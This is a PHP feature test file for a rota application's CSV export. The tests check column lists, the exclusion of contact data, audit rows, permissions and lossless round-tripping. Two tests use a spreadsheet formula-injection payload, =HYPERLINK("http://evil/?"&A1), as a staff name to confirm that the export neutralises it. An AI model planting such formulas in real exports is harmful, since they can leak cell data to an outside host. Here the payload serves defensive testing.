<?php

namespace Tests\Feature\Rota;

use App\Models\AuditLog;
use App\Models\Institution;
use App\Models\Level;
use App\Models\Period;
use App\Models\Person;
use App\Models\Unit;
use App\Models\User;
use App\Models\Vacation;
use App\Support\LevelAssignment;
use App\Support\Roster\CsvRosterReader;
use App\Support\Rota\RotaAssignment;
use App\Support\Rota\VacationBooking;
use Carbon\CarbonImmutable;
use Database\Seeders\AccessControlSeeder;
use Database\Seeders\ReferenceSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Testing\TestResponse;
use Inertia\Testing\AssertableInertia as Assert;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\TestCase;

/**
 * Munawib MR-06's export (P1d-2 Decision G). TWO files on TWO routes, both GET, both behind
 * `cap:rota.manage`, both streamed through `App\Support\Csv::stream()`.
 *
 * WHY TWO FILES. `rota.csv` is one row per SPAN; `vacations.csv` is one row per vacation. One
 * file carrying both shapes is either sparse (half the columns blank on every row) or ambiguous
 * (Task 11's importer has to guess which shape it is reading) — and guessing wrong is how an
 * importer silently misreads a file.
 *
 * WHY NO CONTACT COLUMN. A person is identified by `short_name` — the app-wide UNIQUE handle
 * (finding 5) — plus `full_name` for a human reading the file. No email, no phone, and no
 * `person_id` either: ids are instance-local and meaningless in another deployment. Because no
 * contact field appears in the COLUMN LIST at all, the question "may this viewer see a phone
 * number" never arises, which is the same shape as Decision C's answer for the grid itself. The
 * assertion below is over the FILE'S OWN BYTES rather than over a column list in code: a future
 * hand-built row array carrying `$person->phone` would pass a code-shaped assertion and fail this
 * one.
 *
 * WHY THE FILE IS FAITHFUL RATHER THAN TIDY. Two rows a "clean" export would have dropped are
 * asserted present here:
 *  - a STALE person's spans (somebody deactivated or retired who still holds an assignment).
 *    They are the rows that block `PeriodController::destroy()`, so an administrator exporting
 *    the year to find out why it cannot be cleared must see them. Task 11 answers them with
 *    `SKIP_UNKNOWN_PERSON` and the reason named, never silently.
 *  - a RETIRED unit's code. `RotaGrid` resolves unit codes from the ACTIVE units map, so its
 *    `unit_code` is null in exactly the retired case (P1d-2 Task 5's amendment). The export
 *    therefore reads the code off the assignment's own `unit` relation — the source — and never
 *    off the grid.
 */
class RotaExportTest extends TestCase
{
    use RefreshDatabase;

    private const ASSIGNMENT_HEADERS = [
        'academic_year', 'period_position', 'period_label', 'period_starts_on', 'period_ends_on',
        'short_name', 'full_name', 'unit_code', 'starts_on', 'ends_on',
    ];

    private const VACATION_HEADERS = [
        'short_name', 'full_name', 'starts_on', 'ends_on', 'granularity', 'source',
    ];

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(ReferenceSeeder::class);
        $this->seed(AccessControlSeeder::class);
    }

    /**
     * One row per SPAN, not per cell: a split period is two lines that Task 11 reassembles into
     * one `REPLACE` outcome (finding 12). A file that collapsed a split into one line would
     * describe a rota the department does not have.
     */
    public function test_the_assignment_export_is_one_row_per_span(): void
    {
        [$period, $unit] = $this->seedYear();

        $split = $this->person('Split Fixture', 'split');
        RotaAssignment::split($split, $period, [
            ['unit_id' => $unit->getKey(), 'starts_on' => $period->starts_on->format('Y-m-d'),
                'ends_on' => $period->starts_on->addDays(9)->format('Y-m-d')],
            ['unit_id' => $unit->getKey(), 'starts_on' => $period->starts_on->addDays(10)->format('Y-m-d'),
                'ends_on' => $period->ends_on->format('Y-m-d')],
        ]);

        $rows = $this->readBack($this->exportAssignments());

        $mine = array_values(array_filter($rows, fn (array $r): bool => $r['short_name'] === 'split'));

        $this->assertCount(2, $mine, 'a split cell must export one row per span, never one per cell');
        $this->assertSame($period->starts_on->format('Y-m-d'), $mine[0]['starts_on']);
        $this->assertSame($period->starts_on->addDays(9)->format('Y-m-d'), $mine[0]['ends_on']);
        $this->assertSame($period->ends_on->format('Y-m-d'), $mine[1]['ends_on']);
    }

    /**
     * Decision G's strong form, asserted over the BYTES. The institution is on the most permissive
     * contact setting this system can produce and the viewer is an administrator holding
     * `people.manage`, so BOTH branches of `PersonPolicy::viewContact()` are true — and neither
     * the header row nor the body may carry either field, nor the seeded person's actual number
     * or address anywhere in the file.
     */
    public function test_the_export_carries_no_contact_column(): void
    {
        $this->seedYear();

        Institution::current()->update(['contact_visibility' => Institution::CONTACT_MEMBERS]);
        $this->assertTrue(
            \App\Support\ContactVisibility::membersMaySeeContact(),
            'the institution fixture is not actually on CONTACT_MEMBERS — this test would prove nothing'
        );

        foreach (['assignments' => $this->exportAssignments(), 'vacations' => $this->exportVacations()] as $file => $body) {
            // Non-vacuity: the fixture person is actually in this file.
            $this->assertStringContainsString('Export Fixture', $body, "the {$file} file has no rows to check");

            foreach (['email', 'phone', 'fixture@example.test', '0500000000'] as $needle) {
                $this->assertStringNotContainsStringIgnoringCase($needle, $body,
                    "the {$file} export carried \"{$needle}\"");
            }
        }
    }

    /**
     * The whole column list, asserted exactly. `short_name` is the handle Task 11 matches on and
     * `full_name` is for the human reading the file; `person_id` is deliberately absent — an id
     * is instance-local and means nothing in another deployment (D11 makes cross-instance identity
     * a non-question anyway).
     */
    public function test_a_person_is_identified_by_short_name_and_full_name(): void
    {
        $this->seedYear();

        $this->assertSame(self::ASSIGNMENT_HEADERS, $this->headersOf($this->exportAssignments()));
        $this->assertSame(self::VACATION_HEADERS, $this->headersOf($this->exportVacations()));
    }

    /**
     * `Csv::stream()` neutralises every cell on the way out; this asserts it at the FEATURE level
     * so a future hand-rolled writer in the controller would fail here as well as in
     * `CsvIsTheOnlyReaderWriterTest`. A staff name is genuinely operator-entered free text, which
     * is what makes it the realistic vector.
     */
    public function test_a_formula_cell_is_neutralised_on_the_way_out(): void
    {
        [$period, $unit] = $this->seedYear();

        $attacker = $this->person('=HYPERLINK("http://evil/?"&A1)', '=formula');
        RotaAssignment::set($attacker, $period, $unit);

        $body = $this->exportAssignments();

        $this->assertStringContainsString('\'=HYPERLINK', $body,
            'a full name beginning with = left the export unneutralised');
        $this->assertStringContainsString('\'=formula', $body,
            'a short name beginning with = left the export unneutralised');
    }

    /**
     * Round trip, end to end: the file this system produces is read back by the ONE reader
     * (`CsvRosterReader`, the reader Task 11 uses) and every value must come back identical. The
     * pairing is what makes export -> re-import lossless; without it a formula cell is renamed on
     * every trip. Arabic is in the same case deliberately — the BOM is what stops Excel decoding
     * UTF-8 as the system codepage, and a round trip that mangles a name is indistinguishable to
     * an operator from data corruption.
     */
    public function test_the_export_round_trips_through_the_reader_unchanged(): void
    {
        [$period, $unit] = $this->seedYear();

        $formula = $this->person('=HYPERLINK("http://evil/?"&A1)', '=formula');
        RotaAssignment::set($formula, $period, $unit);
        VacationBooking::book($formula, $period->starts_on->format('Y-m-d'),
            $period->starts_on->addDays(2)->format('Y-m-d'), Vacation::GRANULARITY_DATE);

        $arabic = $this->person('محمد العتيبي', 'm.otaibi');
        RotaAssignment::set($arabic, $period, $unit);
        VacationBooking::book($arabic, $period->starts_on->addDays(4)->format('Y-m-d'),
            $period->starts_on->addDays(6)->format('Y-m-d'), Vacation::GRANULARITY_DATE);

        foreach ([$this->exportAssignments(), $this->exportVacations()] as $body) {
            $rows = $this->readBack($body);
            $byHandle = [];

            foreach ($rows as $row) {
                $byHandle[$row['short_name']] = $row;
            }

            $this->assertArrayHasKey('=formula', $byHandle,
                'the neutralised handle did not come back through the reader');
            $this->assertSame('=HYPERLINK("http://evil/?"&A1)', $byHandle['=formula']['full_name']);

            $this->assertArrayHasKey('m.otaibi', $byHandle);
            $this->assertSame('محمد العتيبي', $byHandle['m.otaibi']['full_name']);
        }
    }

    public function test_the_vacations_export_carries_granularity_and_source(): void
    {
        [$period] = $this->seedYear();

        $person = $this->person('Leave Fixture', 'leave');
        // A `week` booking is SNAPPED by VacationBooking before it is stored, so the file carries
        // the real dates plus the granularity that produced them — Task 11 needs both.
        VacationBooking::book($person, $period->starts_on->addDay()->format('Y-m-d'),
            $period->starts_on->addDays(3)->format('Y-m-d'), Vacation::GRANULARITY_WEEK);

        $rows = $this->readBack($this->exportVacations());
        $mine = array_values(array_filter($rows, fn (array $r): bool => $r['short_name'] === 'leave'));

        $this->assertCount(1, $mine);
        $this->assertSame(Vacation::GRANULARITY_WEEK, $mine[0]['granularity']);
        $this->assertSame(Vacation::SOURCE_MANUAL, $mine[0]['source']);
    }

    /**
     * Decision H's audit discipline: ids, field names and counts only. No filename, no person's
     * name, no unit code, no period label. One row per export, naming which file and how many rows
     * left the building.
     */
    public function test_the_export_audits_counts_only(): void
    {
        [$period, $unit] = $this->seedYear();

        $person = $this->person('Audited Person', 'audited');
        RotaAssignment::set($person, $period, $unit);
        VacationBooking::book($person, $period->starts_on->format('Y-m-d'),
            $period->starts_on->addDays(2)->format('Y-m-d'), Vacation::GRANULARITY_DATE);

        $this->exportAssignments();
        $this->exportVacations();

        $rows = AuditLog::query()->where('action', 'rota_export')->orderBy('id')->pluck('detail')->all();

        // Two of each: `seedYear()`'s own person holds one span and one vacation, and the person
        // above holds one of each too. Stated here rather than derived from the export, because a
        // count read back off the thing under test asserts nothing about the count.
        $this->assertSame([
            'file=assignments;year=2026-2027;rows=2',
            'file=vacations;year=2026-2027;rows=2',
        ], $rows);

        foreach ($rows as $detail) {
            foreach (['Audited Person', 'audited', '.csv', 'Block 1', $unit->code] as $forbidden) {
                $this->assertStringNotContainsString($forbidden, $detail,
                    "the export audit row carried \"{$forbidden}\"");
            }
        }
    }

    /**
     * Finding 5: `people.short_name` is nullable, and a row identified by a blank handle is a row
     * Task 11 answers with `SKIP_UNKNOWN_PERSON`. So the screen names the count BEFORE the file is
     * generated — the alternative is discovering it when a third of the re-import is skipped.
     *
     * The export still RUNS, with the blank handle: dropping the person would lose their spans
     * from a file whose whole job is to describe what the rota holds.
     */
    public function test_a_person_with_no_short_name_is_reported_before_the_file_is_generated(): void
    {
        [$period, $unit] = $this->seedYear();

        $nameless = Person::factory()->create(['full_name' => 'No Handle', 'short_name' => null]);
        RotaAssignment::set($nameless, $period, $unit);

        $props = $this->propsFrom($this->actingAs($this->admin())->get('/admin/rota?year=2026-2027'));

        $this->assertSame(1, $props['people_without_a_short_name'],
            'the editor screen did not warn that a person in this year has no short name');

        $rows = $this->readBack($this->exportAssignments());
        $blank = array_values(array_filter($rows, fn (array $r): bool => $r['full_name'] === 'No Handle'));

        $this->assertCount(1, $blank, 'the person with no handle was silently dropped from the file');
        $this->assertSame('', $blank[0]['short_name']);
    }

    /** A roster member with a short name raises no warning — a warning that always fires is noise. */
    public function test_a_year_whose_people_all_have_a_handle_reports_none(): void
    {
        $this->seedYear();

        $props = $this->propsFrom($this->actingAs($this->admin())->get('/admin/rota?year=2026-2027'));

        $this->assertSame(0, $props['people_without_a_short_name']);
    }

    /**
     * THE STALE-PERSON DECISION. A person who has left but still holds a span IS in the file.
     * Their rows are what block `PeriodController::destroy()`, so an administrator exporting the
     * year to find out why it will not clear must be able to see them; and the export is behind
     * `rota.manage`, the same capability as the EDITOR grid, which shows them for that reason too.
     * (Decision D hides them from the resident READ view; that is a different surface with a
     * different capability and a different question.) Task 11 answers such a row with
     * `SKIP_UNKNOWN_PERSON` and *"no longer on the active roster"* — named, never silent.
     */
    public function test_a_stale_person_who_still_holds_a_span_is_in_the_file(): void
    {
        [$period, $unit] = $this->seedYear();

        $departed = $this->person('Omar Departed', 'omar.d');
        RotaAssignment::set($departed, $period, $unit);
        $departed->forceFill(['active' => false])->save();

        $retired = $this->person('Sara Retired', 'sara.r');
        RotaAssignment::set($retired, $period, $unit);
        VacationBooking::book($retired, $period->starts_on->format('Y-m-d'),
            $period->starts_on->addDays(2)->format('Y-m-d'), Vacation::GRANULARITY_DATE);
        $retired->delete();

        $handles = array_column($this->readBack($this->exportAssignments()), 'short_name');

        $this->assertContains('omar.d', $handles, 'a deactivated person still holding a span is missing');
        $this->assertContains('sara.r', $handles, 'a soft-deleted person still holding a span is missing');

        $onLeave = array_column($this->readBack($this->exportVacations()), 'short_name');
        $this->assertContains('sara.r', $onLeave,
            'a soft-deleted person\'s leave vanished — SoftDeletes\' global scope ate the eager load');
    }

    /**
     * Task 5's amendment, at the export. `RotaGrid::cellFor()` fills `unit_code` from the ACTIVE
     * units map, so a retired unit's span carries a NULL code on the grid. Reading codes off the
     * grid would therefore export a blank unit for exactly the historical spans nobody can
     * re-create — the export goes to the assignment's own `unit` relation instead.
     */
    public function test_a_retired_units_span_keeps_its_code(): void
    {
        [$period] = $this->seedYear();

        $closing = Unit::create(['code' => 'XCU', 'name' => 'Closing Unit', 'active' => true]);
        $person = $this->person('Historical Span', 'histo');
        RotaAssignment::set($person, $period, $closing);
        $closing->forceFill(['active' => false])->save();

        $rows = $this->readBack($this->exportAssignments());
        $mine = array_values(array_filter($rows, fn (array $r): bool => $r['short_name'] === 'histo'));

        $this->assertCount(1, $mine);
        $this->assertSame('XCU', $mine[0]['unit_code'],
            'a retired unit exported a blank code — the export read it off the grid, not the source');
    }

    /**
     * Decision G's capability. A whole-year extraction is an administrative act and the input to
     * Task 11's importer, so it sits behind `rota.manage` (administrator-only after Task 1), not
     * behind `rota.view`, which every seeded position holds. It also keeps the `cap:rota.view`
     * group GET-only AND single, which is what `RotaAccessTest`'s router assertions pin.
     */
    public function test_a_resident_cannot_export(): void
    {
        $this->seedYear();

        $resident = User::factory()->create(['position' => 4]);

        $this->actingAs($resident)->get('/admin/rota/export/assignments?year=2026-2027')->assertForbidden();
        $this->actingAs($resident)->get('/admin/rota/export/vacations?year=2026-2027')->assertForbidden();
        $this->assertSame(0, AuditLog::query()->where('action', 'rota_export')->count(),
            'a refused export still wrote an audit row');
    }

    /**
     * An academic year with no periods has no rota to export — a 404, never an empty file that
     * reads as "the year is empty". A typo in `?year=` must not look like a cleared rota.
     *
     * The KNOWN year is asserted 200 in the same test, first: before the routes existed, every
     * URL in this file answered 404, so the two refusal assertions alone were VACUOUSLY GREEN and
     * would stay green if the routes were deleted tomorrow.
     */
    public function test_an_unknown_year_is_a_404(): void
    {
        $this->seedYear();

        $admin = $this->admin();

        $this->actingAs($admin)->get('/admin/rota/export/assignments?year=2026-2027')->assertOk();

        $this->actingAs($admin)->get('/admin/rota/export/assignments?year=1999-2000')->assertNotFound();
        $this->actingAs($admin)->get('/admin/rota/export/vacations')->assertNotFound();
    }

    private function admin(): User
    {
        return User::factory()->create(['position' => 0]);
    }

    private function exportAssignments(string $year = '2026-2027'): string
    {
        return $this->download("/admin/rota/export/assignments?year={$year}");
    }

    private function exportVacations(string $year = '2026-2027'): string
    {
        return $this->download("/admin/rota/export/vacations?year={$year}");
    }

    private function download(string $uri): string
    {
        $response = $this->actingAs($this->admin())->get($uri);
        $response->assertOk();

        $streamed = $response->baseResponse;
        $this->assertInstanceOf(StreamedResponse::class, $streamed,
            'the export is not a stream — Csv::stream() was not what produced it');

        ob_start();
        $streamed->sendContent();

        return (string) ob_get_clean();
    }

    /**
     * Read the exported bytes back with the ONE reader Task 11 will use. Everything this test
     * asserts about CONTENT goes through here rather than through a substring match on the raw
     * file, because a round trip is the property that matters: the export's contract is that
     * `CsvRosterReader` returns exactly what went in.
     *
     * @return list<array<string, string>>
     */
    private function readBack(string $body): array
    {
        $tmp = tempnam(sys_get_temp_dir(), 'rota');
        file_put_contents($tmp, $body);

        try {
            return array_values(iterator_to_array((new CsvRosterReader($tmp))->rows(), false));
        } finally {
            @unlink($tmp);
        }
    }

    /** @return list<string> */
    private function headersOf(string $body): array
    {
        $tmp = tempnam(sys_get_temp_dir(), 'rota');
        file_put_contents($tmp, $body);

        try {
            return (new CsvRosterReader($tmp))->headers();
        } finally {
            @unlink($tmp);
        }
    }

    /** @return array<string, mixed> */
    private function propsFrom(TestResponse $response): array
    {
        $captured = null;

        $response->assertOk()->assertInertia(function (Assert $page) use (&$captured): void {
            $captured = $page->toArray()['props'];
        });

        $this->assertIsArray($captured);

        return $captured;
    }

    private function person(string $fullName, ?string $shortName): Person
    {
        $person = Person::factory()->create([
            'full_name' => $fullName,
            'short_name' => $shortName,
            'email' => null,
            'phone' => null,
        ]);

        LevelAssignment::assign($person, Level::query()->where('code', 'XE1')->firstOrFail(), '2026-07-01');

        return $person;
    }

    /**
     * One period, one unit, one levelled person holding a whole-period assignment and a vacation
     * — and that person carries BOTH contact fields, because a fixture with a null phone would
     * make `test_the_export_carries_no_contact_column` pass for the wrong reason.
     *
     * `X`-prefixed codes: `Level::factory()->create(['code' => 'R1'])` collides with
     * `ReferenceSeeder`'s seeded ladder (P1c Task 3's recorded trap).
     *
     * @return array{0: Period, 1: Unit}
     */
    private function seedYear(): array
    {
        Level::factory()->create(['code' => 'XE1', 'display_order' => 10]);
        $unit = Unit::create(['code' => 'XEU', 'name' => 'Rota Export Unit', 'active' => true]);

        $start = CarbonImmutable::parse('2026-07-01');

        $period = Period::create([
            'academic_year' => '2026-2027',
            'kind' => Period::WEEK_BLOCK,
            'position' => 1,
            'label' => 'Block 1',
            'starts_on' => $start->format('Y-m-d'),
            'ends_on' => $start->addWeeks(4)->subDay()->format('Y-m-d'),
        ]);

        $person = Person::factory()->create([
            'full_name' => 'Export Fixture',
            'short_name' => 'export.fixture',
            'email' => 'fixture@example.test',
            'phone' => '0500000000',
        ]);

        LevelAssignment::assign($person, Level::query()->where('code', 'XE1')->firstOrFail(),
            $start->format('Y-m-d'));
        RotaAssignment::set($person, $period, $unit);
        VacationBooking::book($person, $start->addDay()->format('Y-m-d'),
            $start->addDays(3)->format('Y-m-d'), Vacation::GRANULARITY_DATE);

        return [$period, $unit];
    }
}
